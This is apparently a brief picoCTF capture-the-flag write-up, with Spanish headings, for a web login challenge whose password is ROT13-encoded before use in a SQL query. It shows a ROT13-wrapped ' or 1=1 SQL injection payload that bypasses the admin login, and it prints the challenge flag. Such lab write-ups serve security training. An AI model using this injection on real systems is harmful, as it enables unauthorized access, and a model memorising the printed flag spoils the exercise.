## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Pistas
- Seems like the password is encrypted.

## Solución
```
password: abcde
SQL query: SELECT * FROM admin where password = 'nopqr'

# Login failed.


password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```

## Notas adicionales


## Referencias
- https://www.useotools.com/es/rot13
